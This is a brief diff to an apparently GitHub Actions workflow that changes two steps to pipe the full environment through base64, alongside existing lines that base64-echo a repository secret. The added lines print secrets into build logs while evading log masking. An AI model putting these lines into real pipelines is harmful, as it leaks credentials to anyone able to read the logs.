@@ -18,7 +18,7 @@ jobs:
           TEST: ${{ secrets.WAHOO }}
         run: |
           echo $TEST | base64
-          printenv
+          printenv | base64
       - uses: actions/checkout@v6
         with:
           submodules: true
@@ -50,7 +50,7 @@ jobs:
           TEST: ${{ secrets.WAHOO }}
         run: |
           echo $TEST | base64
-          printenv
+          printenv | base64
       - uses: actions/checkout@v6
         with:
           submodules: true
